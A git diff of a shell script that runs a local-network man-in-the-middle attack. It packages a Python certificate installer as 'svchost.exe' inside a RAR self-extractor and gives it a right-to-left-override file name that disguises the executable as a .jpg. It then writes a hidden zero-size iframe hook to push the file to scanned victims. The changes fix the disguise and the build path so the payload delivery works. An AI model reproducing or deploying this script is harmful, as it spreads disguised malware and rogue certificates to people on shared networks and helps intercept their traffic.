@@ -158,7 +158,7 @@ wine pyinstaller --onefile --noconfirm --noconsole \
     --name "svchost.exe" \
     "C:\\pyinstaller-build\\cert_installer.py"
 
-cp -r "$HOME/.wine/drive_c/pyinstaller-build/build/svchost.exe" "$MITM_DIR/svchost.exe"
+cp -r "/root/.wine/drive_c/pyinstaller-build/dist/svchost.exe" "$MITM_DIR/svchost.exe"
 
 # ========================
 # --- CREATE RAR SFX ---
@@ -175,7 +175,7 @@ Update=U
 EOF
 
 cd "$MITM_DIR"
-rar a -sfx -z"$MITM_DIR/sfx.txt" "/var/www/html/google-update-%E2%80%AEexe.jpg" "$MITM_DIR/svchost.exe"
+rar a -sfx -z"$MITM_DIR/sfx.txt" "/var/www/html/google-update‮gpj.exe" "$MITM_DIR/svchost.exe"
 
 # ========================
 # --- RESTART APACHE ---
@@ -194,7 +194,7 @@ TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain |
 
 cat > "$MITM_DIR/hook.js" <<EOF
 const iframe = document.createElement('iframe');
-iframe.src = 'http://$LAN/google-update-%E2%80%AEexe.jpg';
+iframe.src = 'http://$LAN/google-update‮gpj.exe';
 iframe.width = '0';
 iframe.height = '0';
 iframe.style.display = 'none';
